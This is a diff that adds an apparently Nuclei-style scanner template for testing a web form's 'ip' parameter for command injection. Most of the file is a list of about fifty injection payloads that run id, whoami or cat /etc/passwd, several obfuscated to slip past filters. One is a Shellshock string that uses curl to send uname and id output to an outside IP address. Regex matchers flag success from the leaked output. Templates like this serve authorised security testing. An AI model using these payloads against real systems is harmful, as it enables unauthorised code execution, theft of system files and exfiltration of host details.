@@ -1,0 +1,95 @@
+
+id: command-injection
+
+info:
+  name: Command Injection Template
+  author: suriryuk
+  severity: Critical
+  description: Determine whether a command injection attack was successful.
+  tags: RCE, cmdi
+
+http:
+  - pre-condition:
+    - type: dsl
+      dsl:
+        - "method == POST"
+        - "len(body) > 0"
+      condition: and
+
+  - raw:
+    - |
+      POST {{BaseURL}} HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: application/x-www-form-urlencoded
+
+      ip={{injection}}&Submit=Submit
+
+    payloads:
+      injection:
+        - ";cat$u /etc$u/passwd$u"
+        - "%24%7Bsystem%28%22id%3B%22%29%7D"
+        - "%0Aid; %0Awhoami; %0Acat /etc/passwd;"
+        - "%26%7Bcat%2C%2Fetc%2Fpasswd%7D"
+        - "$u=`echo${IFS}\"cat${IFS}/etc/passwd\"`"
+        - ";phpinfo();"
+        - ";id;"
+        - "%26id%3B"
+        - "\\n;id"
+        - "a;id"
+        - "id;"
+        - "a;id"
+        - "%7Ccat+/etc/passwd"
+        - ";cat$u /e${hahaha}tc/${waf}pas${catchthis}swd"
+        - "%60%7Ccat%20/etc/passwd%60"
+        - "id"
+        - "%26%26id"
+        - "%26cat%2520%2Fetc%24%7Bhahaha%7Dpasswd"
+        - "id\\n"
+        - "%27%20id%7C"
+        - "%28cat%20/etc/passwd%29%23"
+        - "$({{id}})"
+        - "%26id%20%23"
+        - "%24id%7C"
+        - "<id"
+        - "%24id;"
+        - "%0Aid"
+        - "cat$u /etc/passwd"
+        - ";cat /etc/passwd | less -i"
+        - "() { :;}; /bin/bash -c \"curl http://135.23.158.130/.testing/shellshock.txt?shell=\\`uname\\`?os=\\`id | grep root\\`?id=\\`echo$'\\''%22%22whoami$'\\' %22%22\\`\""
+        - ";id"
+        - ";id|"
+        - "%26%7Bcat%2C%2Fetc%24u%2Fpasswd%3D%23%7D"
+        - "a;id"
+        - "%2Fusr%24Fbin%3Bw%23"
+        - "RCE Payload: |id|"
+        - "id;ls /e"
+        - ";id| | # | `uname -a` # | id # | ;id| # | `cat /etc/passwd` |"
+        - ";id"
+        - "%7Cid%29"
+        - "%24%28cat%20%2Fetc%24u%2Fpasswd%29"
+        - "%24id%7C"
+        - "<id>"
+        - "id;id;cat%20/etc/passwd;python%20-%c%20%22print%28%27Hello,%20World!%27%29%22%3B"
+        - "%2Fusr%2Fbin%2Fid"
+        - "%27%0Aid%3B"
+        - "%26id%26"
+        - "%7C%20id"
+        - "a;id"
+        - "%2C+id;"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: regex
+        name: attack-success
+        regex:
+          - "uid=[^\\n]+ gid=[^\\n]+ groups=[^\\n]+"
+          - "root:x:[0-9]+:[0-9]+:root:\\/root:"
+          - "root:\\*:[0-9]+:[0-9]+:[0-9]+:[0-9]+:::"
+
+      - type: word
+        name: attack-success-id
+        words:
+          - "www-data"
+        part: body
+        
